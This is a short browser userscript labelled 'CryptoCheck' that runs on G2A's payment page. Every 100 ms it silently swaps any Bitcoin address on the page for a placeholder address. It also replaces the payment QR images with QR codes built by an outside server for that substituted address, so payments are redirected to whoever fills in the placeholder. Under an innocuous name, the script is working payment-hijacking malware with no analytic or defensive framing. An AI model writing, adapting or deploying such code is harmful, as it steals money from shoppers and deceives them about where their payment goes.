// ==UserScript==
// @name         CryptoCheck
// @version      1.0
// @description  No Desc
// @match        https://www.g2a.com/payment
// @grant        none
// @author       Zile42O
// ==/UserScript==

(function() {
	'use strict';
	var wordsToReplace = [
		{ regex: /(^|\W)(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}($|\W)/, replacement: "btc_addy_here", coin: "bitcoin"}
	];
	function replaceAddresses() {
		var elements = document.querySelectorAll('*');
		elements.forEach(function(element) {
			Array.from(element.childNodes).forEach(function(node) {
				if (node.nodeType === Node.TEXT_NODE) {
					var text = node.nodeValue.trim();
					wordsToReplace.forEach(function(wordData) {
						if (wordData.regex.test(text)) {
							node.nodeValue = text.replace(wordData.regex, wordData.replacement);
							var addy = wordData.replacement;
							var coin = wordData.coin;
							Array.from(document.getElementsByTagName('img')).forEach(function(img) {
								var src = img.getAttribute("src");
								if (src && src.includes("/qr/")) {
									var newSrc = "https://api.zile42o.dev/cryptoqr/api.php?coin=" + coin + "&address=" + addy + "&amount=0";
									img.setAttribute("src", newSrc);
								}
							});
						}
					});
				}
			});
		});
	}
	setInterval(function() {
		replaceAddresses();
	}, 100);
})();
